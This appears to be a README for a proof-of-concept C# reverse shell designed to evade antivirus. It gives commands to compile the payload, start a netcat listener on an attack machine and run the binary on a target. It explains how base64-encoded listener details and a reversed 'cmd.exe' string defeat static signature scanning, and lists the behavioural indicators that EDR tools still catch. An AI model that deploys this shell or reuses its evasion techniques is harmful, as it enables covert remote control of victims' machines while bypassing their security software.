# C# Reverse Shell AV Evasion POC

## Update the LHOST and LPORT in the code
- **Base64 encoded listener IP**: `MTkyLjE2OC41LjU=` → `192.168.5.5`
- **Base64 encoded listener port**: `NDQ1NQ==` → `4455`

## Compile

`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe shell.cs`


## Start the Listener on the attack machiine

`nc -nvlp 4455`


## Trigger the binary on the target

`shell.exe`


# Obfuscation Techniques Used in the C# Reverse Shell 

This reverse shell utilizes **dynamic string decoding** to bypass static Antivirus (AV) signature analysis. The payload hides sensitive strings on disk and reconstructs them at runtime.

---

## 1. LHOST/LPORT Obfuscation via Base64 Encoding

The listener's IP address and port are encoded using Base64. This prevents Antivirus from matching the payload against signatures that contain known malicious IP/port combinations.

| Variable | Encoded Value | Decoded Value | Decoding Method |
| :--- | :--- | :--- | :--- |
| `b_ip` (LHOST) | `MTkyLjE2OC41LjU=` | `192.168.5.5` | `Convert.FromBase64String` |
| `b_port` (LPORT) | `NDQ1NQ==` | `4455` | `Convert.FromBase64String` |

---

## 2. Shell Command Obfuscation via String Reversal

The critical executable filename (`cmd.exe`) is hidden by reversing its characters. This technique avoids static checks for the literal string that launches the command shell.

| Variable | Obfuscated Value | Decoded Value | Decoding Method |
| :--- | :--- | :--- | :--- |
| `reversedCmd` | `exe.dmc` | `cmd.exe` | Custom `ReverseString` function (`s.Reverse().ToArray()`) |

---

## 3. Behavioral Techniques (Key to Detection)

While the above methods bypass **static** (on-disk) detection, the following code is highly susceptible to **dynamic** (behavioral) detection by modern EDR solutions:

* **Process Creation:** Spawning `cmd.exe` is a common malicious indicator.
* **I/O Redirection:** Redirecting the standard input, output, and error streams of the command prompt over a network socket (`TcpClient`) is the definitive sign of a reverse shell and is easily flagged by behavioral monitoring systems.
* **Networking:** The use of the `System.Net.Sockets.TcpClient` class to establish an outbound connection to an external, potentially suspicious, IP/Port.
